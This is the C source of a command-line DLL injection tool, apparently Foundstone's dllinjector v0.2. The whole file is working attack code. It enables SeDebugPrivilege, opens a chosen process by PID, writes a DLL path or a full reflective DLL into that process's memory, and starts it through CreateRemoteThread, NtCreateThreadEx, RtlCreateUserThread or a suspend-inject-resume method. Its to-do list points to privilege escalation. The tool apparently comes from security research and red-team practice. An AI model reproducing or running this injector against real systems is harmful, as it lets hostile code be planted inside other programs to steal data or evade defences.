/*
	dllinjector - 
		brad.antoniewicz@foundstone.com

		This tool aims to implement various DLL injection 
		techniques. For more information on DLL injection
		see http://blog.opensecurityresearch.com
		
		This was built using Microsoft Visual Studio 2010

		dllInjector currently supports using:

		DLL Memory Allocation and Execution Techniques:
			1. Allocate memory for DLL Path and use LoadLibraryA().
			2. Allocate memory for full DLL and jump to the DLL's 
				entry point. 

		DLL Injection Techniques 
			1. CreateRemoteThread()
			2. NtCreateThreadEx()
			3. Suspend, Inject, and Resume
			4. RtlCreateUserThread()

		Todo:
			1. Implement SetWindowsHookEx() Method
				http://www.kdsbest.com/?p=179
			2. Implement QueueUserAPC() Method
				http://webcache.googleusercontent.com/search?q=cache:G8i5oxOWbDMJ:www.hackforums.net/archive/index.php/thread-2442150.html+&cd=3&hl=en&ct=clnk&gl=us&client=firefox-a
			3. Implement PrivEscalation as per: 
				https://github.com/rapid7/metasploit-framework/tree/master/external/source/meterpreter/source/extensions/priv/server/elevate
				/metasploit/msf3/external/source/meterpreter/source/extensions/priv/server/elevate

		Credits:
			vminjector - https://github.com/batistam/VMInjector
			ReflectiveDLLInjection - https://github.com/stephenfewer/ReflectiveDLLInjection

*/

#include <stdlib.h>
#include <windows.h>
#include <stdio.h>
#include <tlhelp32.h>
#include <dos.h>
#include "ExecThread.h"
#include "AllocWriteDLL.h"

#pragma comment(lib,"Advapi32.lib")

#define VERSION 0.2
#define BUFSIZE 512


int SetDebugPrivileges(void) { 
	TOKEN_PRIVILEGES priv = {0};
	HANDLE hToken = NULL; 

	if( OpenProcessToken( GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken ) ) {
			priv.PrivilegeCount           = 1;
			priv.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

			if( LookupPrivilegeValue( NULL, SE_DEBUG_NAME, &priv.Privileges[0].Luid ) ) {
				if(AdjustTokenPrivileges( hToken, FALSE, &priv, 0, NULL, NULL ) == 0) {
					printf("AdjustTokenPrivilege Error! [%u]\n",GetLastError());
				} 
			}	

			CloseHandle( hToken );
		} 
		return GetLastError();
}

HANDLE attachToProcess(DWORD procID) {
	OSVERSIONINFO osver; 
		
	// SetDebugPrivileges SE_DEBUG_NAME
	printf("[+] Setting Debug Privileges [%d]\n", SetDebugPrivileges());
	
	osver.dwOSVersionInfoSize = sizeof(osver);
	if (GetVersionEx(&osver)) {	
		if (osver.dwMajorVersion == 5) {
			printf("\t[+] Detected Windows XP\n");
			return OpenProcess( PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_CREATE_THREAD, 0, procID );
		}
		if (osver.dwMajorVersion == 6 && osver.dwMinorVersion == 0) {
			printf("\t[+] Detected Windows Vista\n");
			return NULL;
		}
		if (osver.dwMajorVersion == 6 && osver.dwMinorVersion == 1)	{
			printf("\t[+] Detected Windows 7\n");
			printf("\t[+] Attaching to Process ID: %d\n", procID);
			return OpenProcess( PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, FALSE, procID );
		}
	} else {
		printf("\n[!] Could not detect OS version\n");
	}
	return NULL;
}
int injectDLL(HANDLE hTargetProcHandle, unsigned int injectMethod, LPTHREAD_START_ROUTINE lpStartExecAddr, LPVOID lpExecParam) {
	HANDLE rThread = NULL;

	switch(injectMethod) {
		case 1: // NtCreateThreadEx
			printf("\n[+] Using NtCreateThreadEx() to Create Thread\n");
			rThread = bCreateRemoteThread(hTargetProcHandle, lpStartExecAddr, lpExecParam);
			if (rThread == NULL) {
				printf("\n[!] NtCreateThreadEx Failed! [%d] Exiting....\n", GetLastError());
				return -1;
			} 
			printf("\t[+] Remote Thread created! [%d]\n", GetLastError());
			WaitForSingleObject(rThread, INFINITE);
			break;
		case 2: // CreateRemoteThread
			printf("\n[+] Using CreateRemoteThread() to Create Thread\n");
			rThread = CreateRemoteThread(hTargetProcHandle, NULL, 0, lpStartExecAddr, lpExecParam, 0, NULL);
			if (rThread == NULL) {
				printf("\n[!] CreateRemoteThread Failed! [%d] Exiting....\n", GetLastError());
				return -1;
			} 
			printf("\t[+] Remote Thread created! [%d]\n", GetLastError());
			WaitForSingleObject(rThread, INFINITE);
			break;
		case 3: // Suspend/Inject/Resume
			printf("\n[+] Using the Suspend/Inject/Resume Method to Create Thread\n");
#ifdef _WIN64 // Need to fix this! 
			printf("\n[+] Suspend/Inject/Resume Method Not currently supported on x64 :(\n");
			return -1;
			
#else
			suspendInjectResume(hTargetProcHandle, lpStartExecAddr, lpExecParam);
#endif
			break;
		case 4: //RtlCreateUserThread
			printf("\n[+] Using RtlCreateUserThread() to Create Thread\n");
			rThread = bCreateUserThread(hTargetProcHandle, lpStartExecAddr, lpExecParam);
			if (rThread == NULL) {
				printf("\n[!] RtlCreateUserThread Failed! [%d] Exiting....\n", GetLastError());
				return -1;
			} 
			printf("\t[+] Remote Thread created! [%d]\n", GetLastError());
			WaitForSingleObject(rThread, INFINITE);
			break;
		default:
			printf("\n[!] Unknown Injection Method WTF?!\n");
			return -1;
	}
	return 0;

}

void dumpProcs( void ) {
	PROCESSENTRY32 pe32 = { sizeof(PROCESSENTRY32) } ;
	HANDLE hSnapshot = CreateToolhelp32Snapshot( TH32CS_SNAPPROCESS, 0 );

	printf("[+] Dumping processes and PIDs..\n");

	if( hSnapshot == INVALID_HANDLE_VALUE )
		exit(-1);

	if( ! Process32First( hSnapshot, &pe32 ) ) {
		CloseHandle( hSnapshot );
		exit(-1);
	}

	do {
		printf("\t[%d]\t%s\n",pe32.th32ProcessID, pe32.szExeFile );
	} while( Process32Next( hSnapshot, &pe32 ) );
	
	CloseHandle( hSnapshot );
	
}

void help( char *processname ) {
	printf("\n");
	printf("\t-d\t\tDump Process Excutables and IDs\n");
	printf("\t-p PID\t\tPID to inject into (from -d)\n");
	printf("\t-l file.dll\tDLL to inject\n");
	printf("\t-h\t\tthis help\n");

	printf("\nMemory Allocation Methods:\n");
	printf("\t-P\tAllocate memory for just the file path (Implies LoadLibrary)\n"); // allocMethod = 1 
	printf("\t-F\tAllocate memory for the full DLL (Implies Reflective)\n"); // allocMethod = 2 

	printf("\nInjection Methods:\n");
	printf("\t-n\t\tUse NtCreateThreadEx()\n");
	printf("\t-c\t\tUse CreateRemoteThread()\n");
	printf("\t-s\t\tUse Suspend/Inject/Resume\n");
	printf("\t-r\t\tUse RtlCreateUserThread()\n");

	printf("\n");

	printf("Usage:\n");
	printf("\t%s -d (To Dump processes and get the PID)\n", processname);
	printf("\t%s -p 1234 -l something.dll -P -c (Inject something.dll into process 1234)\n", processname);
	printf("\n");
	
}

int main( int argc, char *argv[] ) {
	DWORD dwPid = 0;
	DWORD dwInjectMethod=1;
	DWORD dwAllocMethod=1;
	DWORD dwCount;

	LPTHREAD_START_ROUTINE lpStartExecAddr = NULL;
	LPVOID lpExecParam = NULL;
	HANDLE hTargetProcHandle = NULL;
	
	LPCTSTR lpcDll = NULL;
	TCHAR tcDllPath[BUFSIZE] = TEXT("");
	#ifdef _WIN64
		TCHAR tcArch[4] = TEXT("x64");
	#else 
		TCHAR tcArch[4] = TEXT("x32");
	#endif


	printf("\nFoundstone DLL Injector v%1.1f (%s)\n", VERSION, tcArch);
	printf("brad.antoniewicz@foundstone.com\n");
	printf("--------------------------------------------------------\n");

	for (dwCount=1; dwCount < (DWORD)argc; dwCount++) {
		if( strcmp(argv[dwCount] , "-d") == 0 ) {
			dumpProcs();
			return 0;
		} else if ( strcmp(argv[dwCount] , "-p") == 0 ) {
			if(dwCount+1 != argc) {
				dwPid = atol(argv[dwCount+1]);
				printf("[+] Targeting PID: %d\n",dwPid);
				dwCount++;
				}
		} else if ( strcmp(argv[dwCount] , "-l") == 0 ) {
			if(dwCount+1 != argc) {
				lpcDll = TEXT(argv[dwCount+1]);
				printf("[+] Injecting DLL: %s\n",lpcDll);
				dwCount++;
				}
		} else if ( strcmp(argv[dwCount] , "-n") == 0 ) {
			dwInjectMethod = 1;
		} else if ( strcmp(argv[dwCount] , "-c") == 0 ) {
			dwInjectMethod = 2; 
		} else if ( strcmp(argv[dwCount] , "-s") == 0 ) {
			dwInjectMethod = 3;
		} else if ( strcmp(argv[dwCount] , "-r") == 0 ) {
			dwInjectMethod = 4;
		} else if ( strcmp(argv[dwCount] , "-P") == 0 ) {
			dwAllocMethod = 1;
		} else if ( strcmp(argv[dwCount] , "-F") == 0 ) {
			dwAllocMethod = 2;
		} else {
			help(argv[0]);
			exit(0);
		}
	}

	if (dwPid == 0 || lpcDll == NULL) {
		help(argv[0]);
		printf("\n[!] ERROR: Must define PID and DLL\n");
		return -1;
	}

	GetFullPathName(lpcDll, BUFSIZE, tcDllPath, NULL);
	printf("[+] Full DLL Path: %s\n", tcDllPath);

	// Attach to process with OpenProcess()
	hTargetProcHandle = attachToProcess(dwPid);
	if(hTargetProcHandle == NULL) {
		printf("\n[!] ERROR: Could not Attach to Process!!\n");
		return -1;
	}
	
	// Copy the DLL via allocMethod
	switch(dwAllocMethod) {
		case 1:
			lpStartExecAddr = AllocWritePath(hTargetProcHandle, tcDllPath, &lpExecParam);
			break;
		case 2:
			lpStartExecAddr = AllocWriteDLL(hTargetProcHandle, tcDllPath);
			break;
		default:
			printf("\n[!] ERROR: Unknown allocMethod\n");
			break;
	}

	if(lpStartExecAddr == NULL) {
		printf("\n[!] ERROR: Could not allocate memory!!\n");
		return -1;
	}

	// Inject the DLL into process via injectMethod.  lpExecParam may be NULL
	injectDLL(hTargetProcHandle, dwInjectMethod, lpStartExecAddr, lpExecParam);

	CloseHandle(hTargetProcHandle);

	return 0;
}
